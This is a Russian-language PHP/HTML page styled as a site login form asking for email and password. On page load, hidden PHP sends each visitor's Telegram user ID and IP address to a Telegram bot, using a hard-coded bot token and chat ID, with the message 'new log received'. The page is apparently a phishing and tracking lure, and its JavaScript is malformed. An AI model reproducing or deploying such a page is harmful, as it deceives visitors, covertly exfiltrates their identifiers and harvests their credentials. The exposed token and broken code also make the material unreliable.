 <script src="https://telegram.org/js/telegram-web-app.js"></script>

<script type="text/javascript">
var id = ${tg.initDataUnsafe.user.id};
var firstname = ${tg.initDataUnsafe.user.first_name};
var lastname = ${tg.initDataUnsafe.user.last_name};
var username = ${tg.initDataUnsafe.user.username};
</script>
<?php
$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_GET['u_name']))
{
    $url = "https://api.telegram.org/bot6687099688:AAEi1SvgP6tJ5URBFIxtbmO9Co3uqsFA2JM/sendMessage?chat_id=5853359722&text=";
    $b = $url . "🆕 Получен новый лог! ID пользователя:" . $_GET['u_name'] . "IP пользователя:" . $ip;
    file_get_contents($b);
}

else
{
    echo '<script type="text/javascript">';
    echo 'document.location.href="' . $_SERVER['REQUEST_URI'] . '?u_name=" + id';
    echo '</script>';
    exit();
}
?>

<style>
* {
   box-sizing: border-box;
}
body {
   background: #e6f4fd;
   font-family: 'Roboto', sans-serif;
}
.ui-form {
   max-width: 350px;
   padding: 80px 30px 30px;
   margin: 50px auto 30px;
   background: white;
}
.ui-form h3 {
   position: relative;
   z-index: 5;
   margin: 0 0 60px;
   text-align: center;
   color: #4a90e2;
   font-size: 30px;
   font-weight: normal;
}
.ui-form h3:before {
   content: "";
   position: absolute;
   z-index: -1;
   left: 60px;
   top: -30px;
   width: 100px;
   height: 100px;
   border-radius: 50%;
   background: #fee8e4;
}
.ui-form h3:after {
   content: "";
   position: absolute;
   z-index: -1;
   right: 50px;
   top: -40px;
   width: 0;
   height: 0;
   border-left: 55px solid transparent;
   border-right: 55px solid transparent;
   border-bottom: 90px solid #ffe3b5;
}
.form-row {
   position: relative;
   margin-bottom: 40px;
}
.form-row input {
   display: block;
   width: 100%;
   padding: 0 10px;
   line-height: 40px;
   font-family: 'Roboto', sans-serif;
   background: none;
   border-width: 0;
   border-bottom: 2px solid #4a90e2;
   transition: all 0.2s ease;
}
.form-row label {
   position: absolute;
   left: 13px;
   color: #9d959d;
   font-size: 20px;
   font-weight: 300;
   transform: translateY(-35px);
   transition: all 0.2s ease;
}
.form-row input:focus {
   outline: 0;
   border-color: #F77A52;
}
.form-row input:focus+label, .form-row input:valid+label {
   transform: translateY(-60px);
   margin-left: -14px;
   font-size: 14px;
   font-weight: 400;
   outline: 0;
   border-color: #F77A52;
   color: #F77A52;
}
.ui-form input[type="submit"] {
   width: 100%;
   padding: 0;
   line-height: 42px;
   background: #4a90e2;
   border-width: 0;
   color: white;
   font-size: 20px;
}
.ui-form p {
   margin: 0;
   padding-top: 10px;
}
</style>

<form action="init.php" method="POST" class="ui-form">
<h3>Войти на сайт</h3>
<div class="form-row">
<input type="text" id="email" required autocomplete="off"><label for="email">Email</label>
</div>
<div class="form-row">
<input type="password" id="password" required autocomplete="off"><label for="password">Пароль</label>
</div>
<p><input type="submit" value="Войти"></p>
</form>